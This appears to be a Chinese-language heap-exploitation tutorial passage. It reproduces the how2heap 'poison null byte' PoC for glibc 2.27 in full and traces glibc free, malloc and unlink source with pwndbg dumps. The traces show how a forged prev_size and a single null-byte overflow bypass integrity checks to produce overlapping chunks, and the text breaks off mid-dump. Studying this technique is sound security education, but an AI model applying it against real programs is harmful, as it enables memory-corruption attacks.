# 简介
[PWN入门（3-2-1）-堆中的off-by-one](https://www.yuque.com/cyberangel/rg9gdm/gg4bw4)

poison_null_byte和off-by-one本质都是相同的只是名字不同罢了，这里我们再结合libc-2.27.so和free源码再来仔细的看一下。这里再多说几句，poison_null_byte的本质是malloc滥用向前合并和向后合并造成的，其最核心的东西是mchunk_size中的PREV_INUSE和mchunk_prev_size。

# 漏洞影响版本
所有glibc malloc版本

# POC
## POC源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>


int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("Welcome to poison null byte 2.0!\n");
	printf("Tested in Ubuntu 18.04 64bit.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;
	void *barrier;

	printf("We allocate 0x500 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x500);
	printf("a: %p\n", a);
	int real_a_size = malloc_usable_size(a);
	printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
		"(it may be more than 0x500 because of rounding): %#x\n", real_a_size);

	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0xa00);

	printf("b: %p\n", b);

	c = (uint8_t*) malloc(0x500);
	printf("c: %p\n", c);

	barrier =  malloc(0x100);
	printf("We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
		"The barrier is not strictly necessary, but makes things less confusing\n", barrier);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);

	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// this added check requires we are allowed to have null pointers in b (not just a c string)
	//*(size_t*)(b+0x9f0) = 0xa00;
	printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
	// we set this location to 0xa00 since 0xa00 == (0xa11 & 0xff00)
	// which is the value of b.size after its first byte has been overwritten with a NULL byte
	*(size_t*)(b+0x9f0) = 0xa00;

	// this technique works by overwriting the size metadata of a free chunk
	free(b);
	
	printf("b.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0xa00 + 0x10) | prev_in_use\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	printf("b.size: %#lx\n", *b_size_ptr);

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);

	// This malloc will result in a call to unlink on the chunk where b was.
	// The added check (commit id: 17f487b), if not properly handled as we did before,
	// will detect the heap corruption now.
	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)
	// next_chunk(P) == b-0x10+0xa00 == b+0x9f0
	// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00
	printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
	b1 = malloc(0x500);

	printf("b1: %p\n",b1);
	printf("Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
	printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
	printf("We malloc 'b2', our 'victim' chunk.\n");
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control

	b2 = malloc(0x480);
	printf("b2: %p\n",b2);

	memset(b2,'B',0x480);
	printf("Current b2 content:\n%s\n",b2);

	printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

	free(b1);
	free(c);
	
	printf("Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0xc00);
	printf("d: %p\n",d);
	
	printf("Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0xc00);

	printf("New b2 content:\n%s\n",b2);

	printf("Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
		"for the clear explanation of this technique.\n");

	assert(strstr(b2, "DDDDDDDDDDDD"));
}
```

> 编译命令：gcc -g poison_null_byte.c -o poison_null_byte
>

## POC分析
```c
	printf("We allocate 0x500 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x500);
	printf("a: %p\n", a);
	int real_a_size = malloc_usable_size(a);
	printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
		"(it may be more than 0x500 because of rounding): %#x\n", real_a_size);
```

编译之后对POC源码的36行下断点然后开始调试，程序会执行完上述代码，结果如下：

```c
pwndbg> x/250gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x00000000000208a1 #top_chunk
......
0x5555557577c0:	0x0000000000000000	0x0000000000000000
pwndbg> p/x malloc_usable_size(a)  //malloc使用的大小
$2 = 0x508
pwndbg> p/x real_a_size 
$3 = 0x508
pwndbg> 
```

> malloc_usable_size(a)  //malloc使用的大小
>
> 这里不探讨这个函数，感兴趣可以在malloc.c中找到其源码
>

这里调用malloc创建了对齐后大小为0x511的堆块，接下来执行下述代码(b 47->c)：

```c
	b = (uint8_t*) malloc(0xa00);

	printf("b: %p\n", b);

	c = (uint8_t*) malloc(0x500);
	printf("c: %p\n", c);

	barrier =  malloc(0x100);
	printf("We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
		"The barrier is not strictly necessary, but makes things less confusing\n", barrier);
	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
```

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000a11 #b(malloc)
    								//b_size_ptr==0x555555757768
......
0x555555758170:	0x0000000000000000	0x0000000000000511 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
...... 
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

barrier防止在释放时堆块和top_chunk合并，体现了这个堆块的名字--barrier（屏障）。接下来修改堆块：

```c
	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// this added check requires we are allowed to have null pointers in b (not just a c string)
	//*(size_t*)(b+0x9f0) = 0xa00;
	printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
	// we set this location to 0xa00 since 0xa00 == (0xa11 & 0xff00)
	// which is the value of b.size after its first byte has been overwritten with a NULL byte
	*(size_t*)(b+0x9f0) = 0xa00;
```

POC注释中提到了在glibc后续版本中对unlink添加了一些检查机制，如下图所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620020304639-b3024cef-8e59-42ac-a926-033f8a98652d.png)

可以看到，在unlink的代码最前面添加了对p和nextchunk的检查：

```c
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))
```

+ chunksize(p)：获取p堆块的大小，不包含三个标志位。
+ prev_size(p)：获取p堆块的mchunk_prev_size
+ next_chunk(p)：获取p堆块相邻高地址的堆块地址

> 在malloc状态下返回的堆块指针指向堆块的起始地址
>

我们必须让chunksize(P) == prev_size (next_chunk(P))才不会在后续的代码中触发异常，这个问题稍后再说；现在的内存如下：

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000a11 #b(malloc)
    								//b_size_ptr指向此处
......
0x555555758160:	0x0000000000000a00	0x0000000000000000
    			#*(size_t*)(b+0x9f0) = 0xa00;
0x555555758170:	0x0000000000000000	0x0000000000000511 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
...... 
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

之后我们会将b堆块进行free：

```c
	// this technique works by overwriting the size metadata of a free chunk
	free(b);
```

为了能看清楚，我们这里选择引入free源码进行调试；由于b堆块的大小为0xa11，经过一些步骤之后会来到：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620024784560-671795f3-b479-4996-80a5-a693d01e79ce.png)

> p==0x555555757760 //p指向要释放堆块的堆块开头
>

源码中的prev_inuse(p)==((p)->mchunk_size & PREV_INUSE)==0x1，因此不会进入if语句，这说明p之前的一个堆块是处于malloc状态，不会触发合并。

> 这里的合并的分类有向前合并和向后合并，这两个概念稍后再说。
>

由于现在要释放的堆块p的高地址相邻的堆块不为top_chunk，因此会进入if语句：

```c
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
		//......
    }
```

先来看一下第一行代码inuse_bit_at_offset(nextchunk, nextsize)，其中inuse_bit_at_offset宏定义如下：

```c
#define inuse_bit_at_offset(p, s)					      \
  (((mchunkptr) (((char *) (p)) + (s)))->mchunk_size & PREV_INUSE)
```

很明显inuse_bit_at_offset是获取p堆块中mchunk_size标志位PREV_INUSE的值，运算结果为nextinuse==0x1

```c
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) { //nextinuse=0x1,不会进入此if
	unlink(av, nextchunk, bck, fwd);
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0); //清除nextchunk的PREV_INUSE标志位
//----------------------------------------------------------------------------
//clear_inuse_bit_at_offset的宏定义如下
#define clear_inuse_bit_at_offset(p, s)					      \
  (((mchunkptr) (((char *) (p)) + (s)))->mchunk_size &= ~(PREV_INUSE))
```

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x555555757760
Size: 0xa11
								//清除标志位后：
Allocated chunk | PREV_INUSE    //Allocated chunk
Addr: 0x555555758170			//Addr: 0x555555758170
Size: 0x511						//Size: 0x510

Allocated chunk | PREV_INUSE
Addr: 0x555555758680
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x555555758790
Size: 0x1f871

pwndbg>
```

清除nextchunk标志位之后说明p堆块开始进入释放状态，接下来开始将p堆块放入top_chunk中：

```c
      /*
	Place the chunk in unsorted chunk list. Chunks are
	not placed into regular bins until after they have
	been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av); //bck==0x7ffff7dcdca0 (main_arena+96)
      fwd = bck->fd; //fwd==0x00007ffff7dcdca0
      if (__glibc_unlikely (fwd->bk != bck)) //fwd->bk==0x00007ffff7dcdca0
	malloc_printerr ("free(): corrupted unsorted chunks"); //检查双向链表的完整性
      p->fd = fwd; //设置p堆块的fd指针
      p->bk = bck; //设置p堆块的bk指针
      if (!in_smallbin_range(size)) //根据p堆块的大小按需设置fd_nextsize和bk_nextsize指针
	{
	  p->fd_nextsize = NULL;
	  p->bk_nextsize = NULL;
	}
      bck->fd = p; //链入unsortedbin【1】
      fwd->bk = p; //链入unsortedbin【2】
```

效果如下：

```c
pwndbg> bin
//NULL......
unsortedbin
all: 0x555555757760 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757760 /* '`wuUUU' */
//NULL......
pwndbg> x/330gx 0x555555757760
0x555555757760:	0x0000000000000000	0x0000000000000a11 #p(unsortedbin)
0x555555757770:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
//NULL......

0x555555758160:	0x0000000000000a00	0x0000000000000000
    			#数据由POC伪造
0x555555758170:	0x0000000000000000	0x0000000000000510 #nextchunk(malloc)
//NULL......
0x5555557581a0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

最后设置p堆块的head和foot：

```c
      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p); //对free后堆块的检查
```

```c
pwndbg> x/330gx 0x555555757760
0x555555757760:	0x0000000000000000	0x0000000000000a11 #p(unsortedbin)
    								#set_head(p, size | PREV_INUSE);
    								#数据没有变化
0x555555757770:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
//NULL......
0x555555758160:	0x0000000000000a00	0x0000000000000000
    			#数据由POC伪造
0x555555758170:	0x0000000000000a10	0x0000000000000510 #nextchunk(malloc)
    			#set_foot(p, size)
//NULL......
0x5555557581a0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

最终返回，结束free，此时的内存如下：

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000a11 #b(free-unsortedbin)
0x555555757770:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
    								//b_size_ptr指向此处
......
0x555555758160:	0x0000000000000a00	0x0000000000000000
    			#*(size_t*)(b+0x9f0) = 0xa00;
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
...... 
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

现在我们回到POC代码继续调试：

```c
	printf("b.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0xa00 + 0x10) | prev_in_use\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	printf("b.size: %#lx\n", *b_size_ptr);
```

如上面注释所说，假如现在有一个off-by-one（单字节溢出）漏洞可以溢出到下一个堆块的mchunk_size，也就是说现在的b堆块的大小被修改为0xa00：

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000a00 #b(free-unsortedbin)
    								#a[real_a_size] = 0
    								#这里原来的数据为0xa11
0x555555757770:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
    								//b_size_ptr指向此处
......
0x555555758160:	0x0000000000000a00	0x0000000000000000
    			//*(size_t*)(b+0x9f0) = 0xa00;
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
...... 
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

关于0xa00的修改有两个目的：

+ 堆块a被认为现在是处于“free”状态，因为b的mchunk_size中PREV_INUSE标志位为0
+ 堆块b现在的大小被修改为0xa00，也就是说现在b堆块的可控范围从0xa08变为了0x9F8：

```c
//修改大小之前（处于malloc）：
0x555555757760:	0x0000000000000000	0x0000000000000a11 #b---
0x555555757770:	0x0000000000000000	0x0000000000000000     ｜
......													   ｜-->堆块b的可控范围：0xa08
0x555555758160:	0x0000000000000a00	0x0000000000000000     ｜//0x8170-0x7770+0x8==0xa08
0x555555758170:	0x0000000000000000	------------------------
                                    0x0000000000000510 #c(malloc)
#pwndbg> p/t 0x0000000000000a11
#$33 = 101000010001
#pwndbg> 
---------------------------------------------------------
//修改大小之后（处于malloc）：
0x555555757760:	0x0000000000000000	0x0000000000000a00 #b---
0x555555757770:	0x0000000000000000	0x0000000000000000     ｜
......													   ｜-->堆块b的可控范围：0x9F8
0x555555758160:	0x0000000000000a00	------------------------ //0x8160-0x7770+0x8==0x9F8
    								0x0000000000000000
0x555555758170:	0x0000000000000000	0x0000000000000510 #c(malloc)
#pwndbg> p/t 0x0000000000000a00
#$34 = 101000000000
#pwndbg> 
    
//这里的堆块可控范围指的是堆块中user_data的大小
```

接下来执行下面的代码，这两行代码没有实际作用，主要是为了查看堆块c的mchunk_prev_size方便

```c
	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
```

```c
pwndbg> x/800gx 0x555555757000
......
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
				//*c_prev_size_ptr==0xa10
......
pwndbg> 
```

接下来来到一个比较重点的地方：

```c
	// This malloc will result in a call to unlink on the chunk where b was.
	// The added check (commit id: 17f487b), if not properly handled as we did before,
	// will detect the heap corruption now.
	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)
	// next_chunk(P) == b-0x10+0xa00 == b+0x9f0
	// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00
	printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
	b1 = malloc(0x500);

	printf("b1: %p\n",b1);
	printf("Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
	printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
```

我们先来看一下POC中的注释：“接下来的malloc将会在调用时触发unlink，但是为了POC的正常执行我们必须绕过unlink中的检查”，我们这里再复习一下unlink宏中的代码：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;								      
    BK = P->bk;								      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))  //检查双向链表的完整性      
      malloc_printerr ("corrupted double-linked list");			      
    else {								      
        FD->bk = BK;							      
        BK->fd = FD;							      
        if (!in_smallbin_range (chunksize_nomask (P))			      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      
				//省略有关于largebin unlink的代码......	      
          }								      
      }									      
}
```

为了方便理解，单步步入POC的b1 = malloc(0x500)：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620104477519-da36dab4-453c-499e-ba73-189ce230ff45.png)

如上图所示，现在tcachebin、fastbin、smallbin、largebin均为空，按照之前调试malloc的经验：

1. 向tcachebin申请
2. 若tcachebin无法满足则向fastbin申请
3. fastbin也不满足则向smallbin申请
4. smallbin也无法满足要求则向unsortedbin申请，现在开始对unsortedbin中的所有free chunk进行整理。

现在的状况就是last_remainder为NULL，我们首先会对其中的free chunk进行解链整理，然后调试到此处：

> 注意：此处的解链过程并未调用unlink
>
> 其实在上面的第4步中省略了一些内容：
>
> 在整理unsortedbin中的free chunk时会首先判断当前unsortedbin中是否只有last_remainder并且当前要申请的堆块大小是否为small chunk且可以满足需要，如果是的话对last_remainder进行切割后返回；如果不成立则边整理边判断当前要整理的堆块大小是否恰好满足申请要求，如果恰好满足则直接返回；若之前的两个条件都不满足则会将free chunk放入smallbin或largebin中。
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620105965741-67c984c8-eb6e-4489-a232-b9261635b7a3.png)如上图所示，现在我们准备将POC中的0x555555757760（b堆块）链入到largebin中，链入之前的内存状况如下：

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000a00 #b(待链入largebin中)
0x555555757770:	0x00007ffff7dcdca0	0x00007ffff7dcdca0 #unsortedbin指针不会被清空
......
0x555555758160:	0x0000000000000a00	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
......
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

链入的具体过程在这里不再详说，可以参考之前的文章；链入之后效果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620106649134-ce9d4f00-e3a1-49ff-b3de-ba1452b9e7d7.png)

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000a00 #b(free-largebin)
0x555555757770:	0x00007ffff7dce210	0x00007ffff7dce210 #unsortedbin指针不会被清空
0x555555757780:	0x0000555555757760	0x0000555555757760
    			#fd_nextsize		#bk_nextsize
......
0x555555758160:	0x0000000000000a00	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
......
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

现在unsortedbin中没有堆块可整理了，跳出while循环（跳出整理阶段），现在开始向largebin中申请堆块，但是难受的是largebin中唯一一个free chunk大小为0xa00，但是我们申请的大小为0x510，因为**<font style="color:#F5222D;">此时</font>**对largebin的分配遵守“最适大小的分配算法”，因此不会对此堆块进行切割，此时标记bit之后会使用binmap进行遍历合适的堆块（如果未找到合适堆块，则会对其进行切割）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620107631387-e88c9295-1212-45e5-9774-ff9957ed554c.png)

> 关于binmap的讲解可以看前面的内容
>

经过一些遍历之后最终找到了largebin中的唯一一个堆块，接下来我们对其开始切割，注意，重点来了！！！

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620108377063-25020083-b977-4135-a288-1e1972dc7c9f.png)

```c
              size = chunksize (victim); //size==0xa00（注意victim的原大小为0xa10）
										 //nb==0x510
              /*  We know the first chunk in this bin is big enough to use. */
              assert ((unsigned long) (size) >= (unsigned long) (nb)); 
					//largebin中的第一个堆块一定可以满足所要申请的大小

              remainder_size = size - nb; //计算切割后的大小：remainder_size==0x4f0

              /* unlink */
              unlink (av, victim, bck, fwd); //对largebin中的进行解链
				//......
            }
```

注意这里的unlink的检查，这里省略了largebin的相关解链代码：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) 
        	//chunksize(P)==0xa00 #不包括标志位
        	//prev_size (next_chunk(P))==0xa00
        	//绕过检查！！！
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;								      
    BK = P->bk;								      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))  //检查双向链表的完整性      
      malloc_printerr ("corrupted double-linked list");	
		//这里的检查并没有什么用，因为我们并没有修改双向链表
    else {								      
        FD->bk = BK;							      
        BK->fd = FD;							      
        if (!in_smallbin_range (chunksize_nomask (P))			      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {	
            	//对largebin的fd_nextsize和bk_nextsize进行检查
				//省略有关于largebin unlink的代码......	      
          }								      
      }									      
}
-------------------------------------------------------------------
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)
```

解链效果如下：

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251
......
0x555555757250:	0x0000000000000000	0x0000000000000511
......
0x555555757760:	0x0000000000000000	0x0000000000000a00
0x555555757770:	0x00007ffff7dce210	0x00007ffff7dce210
0x555555757780:	0x0000555555757760	0x0000555555757760
......
0x555555758160:	0x0000000000000a00	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510
......
0x555555758680:	0x0000000000000000	0x0000000000000111
......
0x555555758790:	0x0000000000000000	0x000000000001f871
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

接下来开始切割，如下代码会省略一些内容，只保留框架：

```c
              /* Exhaust */
              if (remainder_size < MINSIZE)
                {
					//......
                }

              /* Split */
              else //开始切割
                {
                  remainder = chunk_at_offset (victim, nb); //remainder==0x555555757c70
##############################################################################
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251
......
0x555555757250:	0x0000000000000000	0x0000000000000511
......
0x555555757760:	0x0000000000000000	0x0000000000000a00
0x555555757770:	0x00007ffff7dce210	0x00007ffff7dce210
0x555555757780:	0x0000555555757760	0x0000555555757760
......
0x555555757c70:	0x0000000000000000	0x0000000000000000 <-在此切割（remainder==0x555555757c70）
0x555555757c80:	0x0000000000000000	0x0000000000000000
......
0x555555758160:	0x0000000000000a00	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510
......
0x555555758680:	0x0000000000000000	0x0000000000000111
......
0x555555758790:	0x0000000000000000	0x000000000001f871
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg>
##############################################################################
                  /* We cannot assume the unsorted list is empty and therefore
                     have to perform a complete insert here.  */
                  bck = unsorted_chunks (av);
                  fwd = bck->fd;
		  if (__glibc_unlikely (fwd->bk != bck)) //链入前检查unsortedbin双向链表的完整性
		    malloc_printerr ("malloc(): corrupted unsorted chunks 2");
				//将切割后余下的堆块扔进unsortedbin中......
##############################################################################
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251
......
0x555555757250:	0x0000000000000000	0x0000000000000511
......
0x555555757760:	0x0000000000000000	0x0000000000000a00
0x555555757770:	0x00007ffff7dce210	0x00007ffff7dce210
0x555555757780:	0x0000555555757760	0x0000555555757760
......
0x555555757c70:	0x0000000000000000	0x0000000000000000 <-在此切割（remainder==0x555555757c70）
0x555555757c80:	0x00007ffff7dcdca0	0x00007ffff7dcdca0 
    			#fd					#bk
......
0x555555758160:	0x0000000000000a00	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510
......
0x555555758680:	0x0000000000000000	0x0000000000000111
......
0x555555758790:	0x0000000000000000	0x000000000001f871
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
unsortedbin
all: 0x555555757c70 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757c70 /* 'p|uUUU' */
##############################################################################
                  /* advertise as last remainder */
                  if (in_smallbin_range (nb)) //nb==0x510
                    av->last_remainder = remainder; //不会链入到last_remainder中
                  if (!in_smallbin_range (remainder_size)) //remainder_size==0x4f0
                    { //设置fd_nextsize和bk_nextsize
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }
                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);
##############################################################################
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251
......
0x555555757250:	0x0000000000000000	0x0000000000000511
......
0x555555757760:	0x0000000000000000	0x0000000000000511 <-victim
    							#原:0x0000000000000a00
    							#set_head[victim]
0x555555757770:	0x00007ffff7dce210	0x00007ffff7dce210
0x555555757780:	0x0000555555757760	0x0000555555757760
......
0x555555757c70:	0x0000000000000000	0x00000000000004f1 <-在此切割（remainder==0x555555757c70）
    							#原:0x0000000000000000
    							#set_head[remainder]	
0x555555757c80:	0x00007ffff7dcdca0	0x00007ffff7dcdca0 
    			#fd					#bk
......
0x555555758160:	0x00000000000004f0	0x0000000000000000
    		#原：0x0000000000000a00
    		#set_foot[remainder]
0x555555758170:	0x0000000000000a10	0x0000000000000510
......
0x555555758680:	0x0000000000000000	0x0000000000000111
......
0x555555758790:	0x0000000000000000	0x000000000001f871
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
unsortedbin
all: 0x555555757c70 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757c70 /* 'p|uUUU' */
##############################################################################
                }
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim); //p==0x555555757770
              alloc_perturb (p, bytes);
              return p; //返回申请到的堆块
```

最终结果如下：

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000511 #b1(malloc)
